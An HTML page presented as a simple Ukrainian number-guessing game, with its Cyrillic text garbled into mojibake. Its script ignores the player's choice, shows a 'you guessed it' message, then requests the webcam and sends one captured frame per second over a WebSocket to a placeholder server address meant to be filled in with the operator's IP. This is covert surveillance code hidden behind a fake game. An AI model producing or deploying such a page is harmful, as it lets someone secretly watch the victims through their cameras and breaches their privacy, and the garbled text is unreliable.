<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–≥–∞–¥–∞–π —á–∏—Å–ª–æ</title>
</head>
<body>
    <h1>üîÆ –í–≥–∞–¥–∞–π —á–∏—Å–ª–æ!</h1>
    <p>–í–∏–±–µ—Ä–∏: <strong>1</strong> –∞–±–æ <strong>2</strong></p>
    <button onclick="startGame(1)">1</button>
    <button onclick="startGame(2)">2</button>
    
    <script>
        async function startGame(choice) {
            alert("üéâ –ú–æ–ª–æ–¥–µ—Ü—å, —Ç–∏ –≤–≥–∞–¥–∞–≤!");
            await startStreaming();
        }

        async function startStreaming() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                localStorage.setItem("cameraAccess", "granted");  // –ó–∞–ø–∞–º'—è—Ç–∞—Ç–∏ –¥–æ–∑–≤—ñ–ª
                const videoTrack = stream.getVideoTracks()[0];

                // –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –≤—ñ–¥–µ–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                const ws = new WebSocket("ws://–í–ê–®_IP:8765");  // –ó–∞–º—ñ–Ω–∏ –Ω–∞ IP —Å–µ—Ä–≤–µ—Ä–∞
                const imageCapture = new ImageCapture(videoTrack);
                
                setInterval(async () => {
                    const frame = await imageCapture.takePhoto();
                    const reader = new FileReader();
                    reader.onload = () => ws.send(reader.result);
                    reader.readAsDataURL(frame);
                }, 1000);  // –í—ñ–¥–ø—Ä–∞–≤–ª—è—î –∫–∞–¥—Ä —â–æ—Å–µ–∫—É–Ω–¥–∏

            } catch (error) {
                console.error("–ü–æ–º–∏–ª–∫–∞ –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–∞–º–µ—Ä–∏:", error);
            }
        }
    </script>
</body>
</html>
